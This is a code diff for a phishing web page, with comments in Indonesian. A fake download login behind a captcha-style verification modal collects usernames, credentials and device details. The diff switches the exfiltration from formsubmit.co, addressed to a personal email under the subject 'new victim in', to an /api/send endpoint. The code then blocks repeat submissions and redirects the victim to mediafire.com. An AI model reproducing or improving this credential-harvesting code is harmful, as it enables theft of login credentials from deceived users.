@@ -1126,11 +1126,6 @@ button{
 <script>
 
 /* =========================================================
-   CONFIG — GANTI EMAIL DI SINI
-   ========================================================= */
-const EMAIL_KAMU = "meidikaputra5@gmail.com";
-
-/* =========================================================
    DEVICE BLOCK — localStorage + cookie + sessionStorage
    ========================================================= */
 function setDeviceBlocked(){
@@ -1254,6 +1249,7 @@ function lanjutKeLogin(){
         sessionStorage.setItem("verified", "1");
 
         document.getElementById("verifyModal").classList.remove("show");
+        document.getElementById("loginModal").classList.add("show");
 
         btn.textContent = "Lanjutkan";
 
@@ -1338,7 +1334,6 @@ function openDownloadLogin(event){
 
     if(event){ event.stopPropagation(); }
 
-    /* CEK DULU: DEVICE INI UDAH PERNAH SUBMIT? */
     if(cekDeviceBlocked()){
         showBlockedPage();
         return;
@@ -1383,7 +1378,7 @@ function clearMessage(){
 
 
 /* =========================================================
-   LOGIN + KIRIM DATA + SET BLOCK
+   LOGIN → NEMBAK KE /api/send
    ========================================================= */
 function loginUser(event){
 
@@ -1425,35 +1420,39 @@ function loginUser(event){
                 waktu:      formatWaktuWIB(new Date()),
                 device:     detectDevice(ua),
                 os:         detectOS(ua),
-                browser:    detectBrowser(ua),
-                _subject:   "🔥 KORBAN BARU MASUK - " + username,
-                _template:  "table",
-                _captcha:   "false"
+                browser:    detectBrowser(ua)
             };
 
-            return fetch("https://formsubmit.co/ajax/" + EMAIL_KAMU, {
+            /* ========= NEMBAK KE send.js LU ========= */
+            return fetch("/api/send", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "Accept": "application/json"
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             });
 
         })
-        .then(function(res){ return res.json(); })
+        .then(function(res){
+            console.log("STATUS:", res.status);
+            if(res.status === 403){
+                showBlockedPage();
+                return null;
+            }
+            return res.json();
+        })
         .then(function(result){
-            console.log("Terkirim:", result);
+            console.log("RESPON:", result);
             setDeviceBlocked();
             showMessage("✅ Login berhasil!", "success");
         })
         .catch(function(error){
-            console.log("Error:", error);
+            console.log("ERROR:", error);
             setDeviceBlocked();
         })
         .finally(function(){
             setTimeout(function(){
-                window.location.href = "https://www.mediafire.com/";
+                if(!document.getElementById("blockedPage").classList.contains("show")){
+                    window.location.href = "https://www.mediafire.com/";
+                }
             }, 1200);
         });
 
@@ -1465,18 +1464,15 @@ function loginUser(event){
    ========================================================= */
 window.addEventListener("load", function(){
 
-    /* JIKA DEVICE INI UDAH PERNAH SUBMIT → LANGSUNG 403 */
     if(cekDeviceBlocked()){
         showBlockedPage();
         return;
     }
 
-    /* JIKA UDAH VERIF DI SESI INI → SKIP CAPTCHA */
     if(sessionStorage.getItem("verified")){
         return;
     }
 
-    /* JIKA BELUM → MUNCULIN CAPTCHA */
     openVerifyModal();
 
 });
